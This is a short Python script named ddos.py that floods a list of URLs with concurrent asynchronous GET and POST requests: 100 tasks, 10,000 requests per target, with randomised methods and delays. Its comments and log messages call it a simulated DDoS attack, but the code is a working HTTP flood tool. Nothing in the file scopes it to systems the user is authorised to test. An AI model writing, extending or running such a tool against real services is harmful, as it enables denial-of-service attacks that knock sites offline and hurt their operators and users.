# ddos.py

import time
import random
import logging
import asyncio
import aiohttp # send async requests for non blocking IO operations

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s:%(message)s')

async def send_async_requests(session, target_url, num_requests):
    for _ in range(num_requests):
        try:
            method = random.choice(["GET", "POST"]) # randomize request methods
            if method == "GET":
                async with session.get(target_url) as response:
                    await response.text()
            else:
                async with session.post(target_url, data={"key": "value"}) as response:
                    await response.text()
            await asyncio.sleep(random.uniform(0.01, 0.1))  # Random delay between requests
        except Exception as e:
            logging.error(f"Request failed: {e}")

async def simulate_ddos_attack(target_url, total_requests, num_threads): # multithreading to send requests concurrently
    requests_per_thread = total_requests // num_threads
    tasks = []
    async with aiohttp.ClientSession() as session:
        for _ in range(num_threads):
            task = asyncio.create_task(send_async_requests(session, target_url, requests_per_thread))
            tasks.append(task)
        await asyncio.gather(*tasks)

def run_ddos_simulation(target_urls, total_requests, num_threads):
    start_time = time.time()
    loop = asyncio.get_event_loop()
    for target_url in target_urls:
        loop.run_until_complete(simulate_ddos_attack(target_url, total_requests, num_threads))
    end_time = time.time()
    logging.info(f"Simulated DDoS attack completed in {end_time - start_time:.2f} seconds")

if __name__ == "__main__":
    target_urls = [
        'http://example.com/api/v1/resource1',
        'http://example.com/api/v1/resource2',
        'http://example.com/api/v1/resource3'
    ]

    # Simulate a realistic DDoS attack
    total_requests = 10000  # Total number of requests
    num_threads = 100       # Number of concurrent threads

    run_ddos_simulation(target_urls, total_requests, num_threads)
